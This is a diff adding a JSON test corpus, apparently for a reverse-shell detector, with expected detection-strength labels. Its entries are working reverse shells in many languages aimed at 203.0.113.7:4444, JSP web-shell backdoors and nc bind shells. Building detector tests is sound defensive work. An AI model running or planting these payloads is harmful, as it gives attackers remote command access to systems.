+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none"
+   ]
+  },
+  {
+   "name": "Python #1",
+   "section": "ReverseShell",
+   "meta": [
+    "linux",
+    "mac"
+   ],
+   "lines": [
+    "export RHOST=\"203.0.113.7\";export RPORT=4444;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"sh\")'"
+   ],
+   "expected_min_strength": [
+    "strong"
+   ]
+  },
+  {
+   "name": "Python #2",
+   "section": "ReverseShell",
+   "meta": [
+    "linux",
+    "mac"
+   ],
+   "lines": [
+    "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"203.0.113.7\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"sh\")'"
+   ],
+   "expected_min_strength": [
+    "strong"
+   ]
+  },
+  {
+   "name": "Python3 #1",
+   "section": "ReverseShell",
+   "meta": [
+    "linux",
+    "mac"
+   ],
+   "lines": [
+    "export RHOST=\"203.0.113.7\";export RPORT=4444;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"sh\")'"
+   ],
+   "expected_min_strength": [
+    "strong"
+   ]
+  },
+  {
+   "name": "Python3 #2",
+   "section": "ReverseShell",
+   "meta": [
+    "linux",
+    "mac"
+   ],
+   "lines": [
+    "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"203.0.113.7\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"sh\")'"
+   ],
+   "expected_min_strength": [
+    "strong"
+   ]
+  },
+  {
+   "name": "Python3 Windows",
+   "section": "ReverseShell",
+   "meta": [
+    "windows"
+   ],
+   "lines": [
+    "import os,socket,subprocess,threading;",
+    "def s2p(s, p):",
+    "    while True:",
+    "        data = s.recv(1024)",
+    "        if len(data) > 0:",
+    "            p.stdin.write(data)",
+    "            p.stdin.flush()",
+    "def p2s(s, p):",
+    "    while True:",
+    "        s.send(p.stdout.read(1))",
+    "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)",
+    "s.connect((\"203.0.113.7\",4444))",
+    "p=subprocess.Popen([\"cmd\"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)",
+    "s2p_thread = threading.Thread(target=s2p, args=[s, p])",
+    "s2p_thread.daemon = True",
+    "s2p_thread.start()",
+    "p2s_thread = threading.Thread(target=p2s, args=[s, p])",
+    "p2s_thread.daemon = True",
+    "p2s_thread.start()",
+    "try:",
+    "    p.wait()",
+    "except KeyboardInterrupt:",
+    "    s.close()"
+   ],
+   "expected_min_strength": [
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none"
+   ]
+  },
+  {
+   "name": "Python3 shortest",
+   "section": "ReverseShell",
+   "meta": [
+    "linux"
+   ],
+   "lines": [
+    "python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"203.0.113.7\",4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"sh\")'"
+   ],
+   "expected_min_strength": [
+    "strong"
+   ]
+  },
+  {
+   "name": "Ruby #1",
+   "section": "ReverseShell",
+   "meta": [
+    "linux",
+    "mac"
+   ],
+   "lines": [
+    "ruby -rsocket -e'spawn(\"sh\",[:in,:out,:err]=>TCPSocket.new(\"203.0.113.7\",4444))'"
+   ],
+   "expected_min_strength": [
+    "strong"
+   ]
+  },
+  {
+   "name": "Ruby no sh",
+   "section": "ReverseShell",
+   "meta": [
+    "linux",
+    "mac"
+   ],
+   "lines": [
+    "ruby -rsocket -e'exit if fork;c=TCPSocket.new(\"203.0.113.7\",\"4444\");loop{c.gets.chomp!;(exit! if $_==\"exit\");($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r){|io|c.print io.read}))rescue c.puts \"failed: #{$_}\"}'"
+   ],
+   "expected_min_strength": [
+    "medium"
+   ]
+  },
+  {
+   "name": "socat #1",
+   "section": "ReverseShell",
+   "meta": [
+    "linux",
+    "mac"
+   ],
+   "lines": [
+    "socat TCP:203.0.113.7:4444 EXEC:sh"
+   ],
+   "expected_min_strength": [
+    "strong"
+   ]
+  },
+  {
+   "name": "socat #2 (TTY)",
+   "section": "ReverseShell",
+   "meta": [
+    "linux",
+    "mac"
+   ],
+   "lines": [
+    "socat TCP:203.0.113.7:4444 EXEC:'sh',pty,stderr,setsid,sigint,sane"
+   ],
+   "expected_min_strength": [
+    "strong"
+   ]
+  },
+  {
+   "name": "sqlite3 nc mkfifo",
+   "section": "ReverseShell",
+   "meta": [
+    "linux",
+    "mac"
+   ],
+   "lines": [
+    "sqlite3 /dev/null '.shell rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 203.0.113.7 4444 >/tmp/f'"
+   ],
+   "expected_min_strength": [
+    "strong"
+   ]
+  },
+  {
+   "name": "node.js",
+   "section": "ReverseShell",
+   "meta": [
+    "linux",
+    "mac"
+   ],
+   "lines": [
+    "require('child_process').exec('nc -e sh 203.0.113.7 4444')"
+   ],
+   "expected_min_strength": [
+    "strong"
+   ]
+  },
+  {
+   "name": "node.js #2",
+   "section": "ReverseShell",
+   "meta": [
+    "linux",
+    "mac",
+    "windows"
+   ],
+   "lines": [
+    "(function(){",
+    "    var net = require(\"net\"),",
+    "        cp = require(\"child_process\"),",
+    "        sh = cp.spawn(\"sh\", []);",
+    "    var client = new net.Socket();",
+    "    client.connect(4444, \"203.0.113.7\", function(){",
+    "        client.pipe(sh.stdin);",
+    "        sh.stdout.pipe(client);",
+    "        sh.stderr.pipe(client);",
+    "    });",
+    "    return /a/; // Prevents the Node.js application from crashing",
+    "})();"
+   ],
+   "expected_min_strength": [
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "strong",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none"
+   ]
+  },
+  {
+   "name": "Java #1",
+   "section": "ReverseShell",
+   "meta": [
+    "linux",
+    "mac"
+   ],
+   "lines": [
+    "public class shell {",
+    "    public static void main(String[] args) {",
+    "        Process p;",
+    "        try {",
+    "            p = Runtime.getRuntime().exec(\"bash -c $@|bash 0 echo bash -i >& /dev/tcp/203.0.113.7/4444 0>&1\");",
+    "            p.waitFor();",
+    "            p.destroy();",
+    "        } catch (Exception e) {}",
+    "    }",
+    "}"
+   ],
+   "expected_min_strength": [
+    "none",
+    "none",
+    "none",
+    "none",
+    "strong",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none"
+   ]
+  },
+  {
+   "name": "Java #2",
+   "section": "ReverseShell",
+   "meta": [
+    "linux",
+    "mac"
+   ],
+   "lines": [
+    "public class shell {",
+    "    public static void main(String[] args) {",
+    "        ProcessBuilder pb = new ProcessBuilder(\"bash\", \"-c\", \"$@| bash -i >& /dev/tcp/203.0.113.7/4444 0>&1\")",
+    "            .redirectErrorStream(true);",
+    "        try {",
+    "            Process p = pb.start();",
+    "            p.waitFor();",
+    "            p.destroy();",
+    "        } catch (Exception e) {}",
+    "    }",
+    "}"
+   ],
+   "expected_min_strength": [
+    "none",
+    "none",
+    "strong",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none"
+   ]
+  },
+  {
+   "name": "Java #3",
+   "section": "ReverseShell",
+   "meta": [
+    "windows",
+    "linux",
+    "mac"
+   ],
+   "lines": [
+    "import java.io.InputStream;",
+    "import java.io.OutputStream;",
+    "import java.net.Socket;",
+    "public class shell {",
+    "    public static void main(String[] args) {",
+    "        String host = \"203.0.113.7\";",
+    "        int port = 4444;",
+    "        String cmd = \"sh\";",
+    "        try {",
+    "            Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start();",
+    "            Socket s = new Socket(host, port);",
+    "            InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();",
+    "            OutputStream po = p.getOutputStream(), so = s.getOutputStream();",
+    "            while (!s.isClosed()) {",
+    "                while (pi.available() > 0)",
+    "                    so.write(pi.read());",
+    "                while (pe.available() > 0)",
+    "                    so.write(pe.read());",
+    "                while (si.available() > 0)",
+    "                    po.write(si.read());",
+    "                so.flush();",
+    "                po.flush();",
+    "                Thread.sleep(50);",
+    "                try {",
+    "                    p.exitValue();",
+    "                    break;",
+    "                } catch (Exception e) {}",
+    "            }",
+    "            p.destroy();",
+    "            s.close();",
+    "        } catch (Exception e) {}",
+    "    }",
+    "}"
+   ],
+   "expected_min_strength": [
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none"
+   ]
+  },
+  {
+   "name": "Java Web",
+   "section": "ReverseShell",
+   "meta": [
+    "windows",
+    "linux",
+    "mac"
+   ],
+   "lines": [
+    "<%@",
+    "page import=\"java.lang.*, java.util.*, java.io.*, java.net.*\"",
+    "% >",
+    "<%!",
+    "static class StreamConnector extends Thread",
+    "{",
+    "        InputStream is;",
+    "        OutputStream os;",
+    "        StreamConnector(InputStream is, OutputStream os)",
+    "        {",
+    "                this.is = is;",
+    "                this.os = os;",
+    "        }",
+    "        public void run()",
+    "        {",
+    "                BufferedReader isr = null;",
+    "                BufferedWriter osw = null;",
+    "                try",
+    "                {",
+    "                        isr = new BufferedReader(new InputStreamReader(is));",
+    "                        osw = new BufferedWriter(new OutputStreamWriter(os));",
+    "                        char buffer[] = new char[8192];",
+    "                        int lenRead;",
+    "                        while( (lenRead = isr.read(buffer, 0, buffer.length)) > 0)",
+    "                        {",
+    "                                osw.write(buffer, 0, lenRead);",
+    "                                osw.flush();",
+    "                        }",
+    "                }",
+    "                catch (Exception ioe)",
+    "                try",
+    "                {",
+    "                        if(isr != null) isr.close();",
+    "                        if(osw != null) osw.close();",
+    "                }",
+    "                catch (Exception ioe)",
+    "        }",
+    "}",
+    "%>",
+    "<h1>JSP Backdoor Reverse Shell</h1>",
+    "<form method=\"post\">",
+    "IP Address",
+    "<input type=\"text\" name=\"ipaddress\" size=30>",
+    "Port",
+    "<input type=\"text\" name=\"port\" size=10>",
+    "<input type=\"submit\" name=\"Connect\" value=\"Connect\">",
+    "</form>",
+    "<p>",
+    "<hr>",
+    "<%",
+    "String ipAddress = request.getParameter(\"ipaddress\");",
+    "String ipPort = request.getParameter(\"port\");",
+    "if(ipAddress != null && ipPort != null)",
+    "{",
+    "        Socket sock = null;",
+    "        try",
+    "        {",
+    "                sock = new Socket(ipAddress, (new Integer(ipPort)).intValue());",
+    "                Runtime rt = Runtime.getRuntime();",
+    "                Process proc = rt.exec(\"cmd.exe\");",
+    "                StreamConnector outputConnector =",
+    "                        new StreamConnector(proc.getInputStream(),",
+    "                                          sock.getOutputStream());",
+    "                StreamConnector inputConnector =",
+    "                        new StreamConnector(sock.getInputStream(),",
+    "                                          proc.getOutputStream());",
+    "                outputConnector.start();",
+    "                inputConnector.start();",
+    "        }",
+    "        catch(Exception e) ",
+    "}",
+    "%>"
+   ],
+   "expected_min_strength": [
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none"
+   ]
+  },
+  {
+   "name": "Java Two Way",
+   "section": "ReverseShell",
+   "meta": [
+    "windows",
+    "linux",
+    "mac"
+   ],
+   "lines": [
+    "<%",
+    "    /*",
+    "     * Usage: This is a 2 way shell, one web shell and a reverse shell. First, it will try to connect to a listener (atacker machine), with the IP and Port specified at the end of the file.",
+    "     * If it cannot connect, an HTML will prompt and you can input commands (sh/cmd) there and it will prompts the output in the HTML.",
+    "     * Note that this last functionality is slow, so the first one (reverse shell) is recommended. Each time the button \"send\" is clicked, it will try to connect to the reverse shell again (apart from executing ",
+    "     * the command specified in the HTML form). This is to avoid to keep it simple.",
+    "     */",
+    "%>",
+    "<%@page import=\"java.lang.*\"%>",
+    "<%@page import=\"java.io.*\"%>",
+    "<%@page import=\"java.net.*\"%>",
+    "<%@page import=\"java.util.*\"%>",
+    "<html>",
+    "<head>",
+    "    <title>jrshell</title>",
+    "</head>",
+    "<body>",
+    "<form METHOD=\"POST\" NAME=\"myform\" ACTION=\"\">",
+    "    <input TYPE=\"text\" NAME=\"shell\">",
+    "    <input TYPE=\"submit\" VALUE=\"Send\">",
+    "</form>",
+    "<pre>",
+    "<%",
+    "    // Define the OS",
+    "    String shellPath = null;",
+    "    try",
+    "    {",
+    "        if (System.getProperty(\"os.name\").toLowerCase().indexOf(\"windows\") == -1) {",
+    "            shellPath = new String(\"/bin/sh\");",
+    "        } else {",
+    "            shellPath = new String(\"cmd.exe\");",
+    "        }",
+    "    } catch( Exception e ){}",
+    "    // INNER HTML PART",
+    "    if (request.getParameter(\"shell\") != null) {",
+    "        out.println(\"Command: \" + request.getParameter(\"shell\") + \"\\n<BR>\");",
+    "        Process p;",
+    "        if (shellPath.equals(\"cmd.exe\"))",
+    "            p = Runtime.getRuntime().exec(\"cmd.exe /c \" + request.getParameter(\"shell\"));",
+    "        else",
+    "            p = Runtime.getRuntime().exec(\"/bin/sh -c \" + request.getParameter(\"shell\"));",
+    "        OutputStream os = p.getOutputStream();",
+    "        InputStream in = p.getInputStream();",
+    "        DataInputStream dis = new DataInputStream(in);",
+    "        String disr = dis.readLine();",
+    "        while ( disr != null ) {",
+    "            out.println(disr);",
+    "            disr = dis.readLine();",
+    "        }",
+    "    }",
+    "    // TCP PORT PART",
+    "    class StreamConnector extends Thread",
+    "    {",
+    "        InputStream wz;",
+    "        OutputStream yr;",
+    "        StreamConnector( InputStream wz, OutputStream yr ) {",
+    "            this.wz = wz;",
+    "            this.yr = yr;",
+    "        }",
+    "        public void run()",
+    "        {",
+    "            BufferedReader r  = null;",
+    "            BufferedWriter w = null;",
+    "            try",
+    "            {",
+    "                r  = new BufferedReader(new InputStreamReader(wz));",
+    "                w = new BufferedWriter(new OutputStreamWriter(yr));",
+    "                char buffer[] = new char[8192];",
+    "                int length;",
+    "                while( ( length = r.read( buffer, 0, buffer.length ) ) > 0 )",
+    "                {",
+    "                    w.write( buffer, 0, length );",
+    "                    w.flush();",
+    "                }",
+    "            } catch( Exception e ){}",
+    "            try",
+    "            {",
+    "                if( r != null )",
+    "                    r.close();",
+    "                if( w != null )",
+    "                    w.close();",
+    "            } catch( Exception e ){}",
+    "        }",
+    "    }",
+    "    try {",
+    "        Socket socket = new Socket( \"203.0.113.7\", 4444 ); // Replace with wanted ip and port",
+    "        Process process = Runtime.getRuntime().exec( shellPath );",
+    "        new StreamConnector(process.getInputStream(), socket.getOutputStream()).start();",
+    "        new StreamConnector(socket.getInputStream(), process.getOutputStream()).start();",
+    "        out.println(\"port opened on \" + socket);",
+    "     } catch( Exception e ) {}",
+    "%>",
+    "</pre>",
+    "</body>",
+    "</html>"
+   ],
+   "expected_min_strength": [
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "medium",
+    "none",
+    "medium",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "medium",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none"
+   ]
+  },
+  {
+   "name": "Javascript",
+   "section": "ReverseShell",
+   "meta": [
+    "linux",
+    "mac",
+    "windows"
+   ],
+   "lines": [
+    "String command = \"var host = '203.0.113.7';\" +",
+    "                       \"var port = 4444;\" +",
+    "                       \"var cmd = 'sh';\"+",
+    "                       \"var s = new java.net.Socket(host, port);\" +",
+    "                       \"var p = new java.lang.ProcessBuilder(cmd).redirectErrorStream(true).start();\"+",
+    "                       \"var pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();\"+",
+    "                       \"var po = p.getOutputStream(), so = s.getOutputStream();\"+",
+    "                       \"print ('Connected');\"+",
+    "                       \"while (!s.isClosed()) {\"+",
+    "                       \"    while (pi.available() > 0)\"+",
+    "                       \"        so.write(pi.read());\"+",
+    "                       \"    while (pe.available() > 0)\"+",
+    "                       \"        so.write(pe.read());\"+",
+    "                       \"    while (si.available() > 0)\"+",
+    "                       \"        po.write(si.read());\"+",
+    "                       \"    so.flush();\"+",
+    "                       \"    po.flush();\"+",
+    "                       \"    java.lang.Thread.sleep(50);\"+",
+    "                       \"    try {\"+",
+    "                       \"        p.exitValue();\"+",
+    "                       \"        break;\"+",
+    "                       \"    }\"+",
+    "                       \"    catch (e) {\"+",
+    "                       \"    }\"+",
+    "                       \"}\"+",
+    "                       \"p.destroy();\"+",
+    "                       \"s.close();\";",
+    "String x = \"\\\"\\\".getClass().forName(\\\"javax.script.ScriptEngineManager\\\").newInstance().getEngineByName(\\\"JavaScript\\\").eval(\\\"\"+command+\"\\\")\";",
+    "ref.add(new StringRefAddr(\"x\", x);"
+   ],
+   "expected_min_strength": [
+    "none",
+    "none",
+    "none",
+    "none",
+    "weak",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none"
+   ]
+  },
+  {
+   "name": "Groovy",
+   "section": "ReverseShell",
+   "meta": [
+    "windows"
+   ],
+   "lines": [
+    "String host=\"203.0.113.7\";int port=4444;String cmd=\"cmd\";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();"
+   ],
+   "expected_min_strength": [
+    "none"
+   ]
+  },
+  {
+   "name": "telnet",
+   "section": "ReverseShell",
+   "meta": [
+    "linux",
+    "mac"
+   ],
+   "lines": [
+    "TF=$(mktemp -u);mkfifo $TF && telnet 203.0.113.7 4444 0<$TF | sh 1>$TF"
+   ],
+   "expected_min_strength": [
+    "strong"
+   ]
+  },
+  {
+   "name": "zsh",
+   "section": "ReverseShell",
+   "meta": [
+    "linux",
+    "mac"
+   ],
+   "lines": [
+    "zsh -c 'zmodload zsh/net/tcp && ztcp 203.0.113.7 4444 && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'"
+   ],
+   "expected_min_strength": [
+    "strong"
+   ]
+  },
+  {
+   "name": "Lua #1",
+   "section": "ReverseShell",
+   "meta": [
+    "linux"
+   ],
+   "lines": [
+    "lua -e \"require('socket');require('os');t=socket.tcp();t:connect('203.0.113.7','4444');os.execute('sh -i <&3 >&3 2>&3');\""
+   ],
+   "expected_min_strength": [
+    "strong"
+   ]
+  },
+  {
+   "name": "Lua #2",
+   "section": "ReverseShell",
+   "meta": [
+    "linux",
+    "windows"
+   ],
+   "lines": [
+    "lua5.1 -e 'local host, port = \"203.0.113.7\", 4444 local socket = require(\"socket\") local tcp = socket.tcp() local io = require(\"io\") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, \"r\") local s = f:read(\"*a\") f:close() tcp:send(s) if status == \"closed\" then break end end tcp:close()'"
+   ],
+   "expected_min_strength": [
+    "none"
+   ]
+  },
+  {
+   "name": "Golang",
+   "section": "ReverseShell",
+   "meta": [
+    "linux",
+    "mac",
+    "windows"
+   ],
+   "lines": [
+    "echo 'package main;import\"os/exec\";import\"net\";func main(){c,_:=net.Dial(\"tcp\",\"203.0.113.7:4444\");cmd:=exec.Command(\"sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go"
+   ],
+   "expected_min_strength": [
+    "strong"
+   ]
+  },
+  {
+   "name": "Vlang",
+   "section": "ReverseShell",
+   "meta": [
+    "linux",
+    "mac"
+   ],
+   "lines": [
+    "echo 'import os' > /tmp/t.v && echo 'fn main() { os.system(\"nc -e sh 203.0.113.7 4444 0>&1\") }' >> /tmp/t.v && v run /tmp/t.v && rm /tmp/t.v"
+   ],
+   "expected_min_strength": [
+    "strong"
+   ]
+  },
+  {
+   "name": "Awk",
+   "section": "ReverseShell",
+   "meta": [
+    "linux",
+    "mac"
+   ],
+   "lines": [
+    "awk 'BEGIN {s = \"/inet/tcp/0/203.0.113.7/4444\"; while(42) { do{ printf \"shell>\" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != \"exit\") close(s); }}' /dev/null"
+   ],
+   "expected_min_strength": [
+    "strong"
+   ]
+  },
+  {
+   "name": "Dart",
+   "section": "ReverseShell",
+   "meta": [
+    "linux",
+    "mac",
+    "windows"
+   ],
+   "lines": [
+    "import 'dart:io';",
+    "import 'dart:convert';",
+    "main() {",
+    "  Socket.connect(\"203.0.113.7\", 4444).then((socket) {",
+    "    socket.listen((data) {",
+    "      Process.start('sh', []).then((Process process) {",
+    "        process.stdin.writeln(new String.fromCharCodes(data).trim());",
+    "        process.stdout",
+    "          .transform(utf8.decoder)",
+    "          .listen((output) { socket.write(output); });",
+    "      });",
+    "    },",
+    "    onDone: () {",
+    "      socket.destroy();",
+    "    });",
+    "  });",
+    "}"
+   ],
+   "expected_min_strength": [
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none"
+   ]
+  },
+  {
+   "name": "Crystal (system)",
+   "section": "ReverseShell",
+   "meta": [
+    "linux",
+    "windows",
+    "mac"
+   ],
+   "lines": [
+    "crystal eval 'require \"process\";require \"socket\";c=Socket.tcp(Socket::Family::INET);c.connect(\"203.0.113.7\",4444);loop{m,l=c.receive;p=Process.new(m.rstrip(\"\\n\"),output:Process::Redirect::Pipe,shell:true);c<<p.output.gets_to_end}'"
+   ],
+   "expected_min_strength": [
+    "none"
+   ]
+  },
+  {
+   "name": "Crystal (code)",
+   "section": "ReverseShell",
+   "meta": [
+    "linux",
+    "mac"
+   ],
+   "lines": [
+    "require \"process\"",
+    "require \"socket\"",
+    "c = Socket.tcp(Socket::Family::INET)",
+    "c.connect(\"203.0.113.7\", 4444)",
+    "loop do ",
+    "  m, l = c.receive",
+    "  p = Process.new(m.rstrip(\"\\n\"), output:Process::Redirect::Pipe, shell:true)",
+    "  c << p.output.gets_to_end",
+    "end"
+   ],
+   "expected_min_strength": [
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none",
+    "none"
+   ]
+  },
+  {
+   "name": "nc -e Bind",
+   "section": "BindShell",
+   "meta": [
+    "bind",
+    "mac",
+    "linux"
+   ],
+   "lines": [
+    "nc -nlvp 4444 -e /bin/sh"
+   ],
+   "expected_min_strength": [
+    "strong"
+   ]
+  },
+  {
+   "name": "nc.exe -e Bind",
+   "section": "BindShell",
+   "meta": [
+    "bind",
+    "windows"
+   ],
+   "lines": [
+    "nc.exe -nlvp 4444 -e cmd"
+   ],
+   "expected_min_strength": [
+    "strong"
+   ]
+  },
+  {
+   "name": "nc mkfifo Bind",
+   "section": "BindShell",
+   "meta": [
+    "bind",
+    "mac",
+    "linux"
+   ],
+   "lines": [
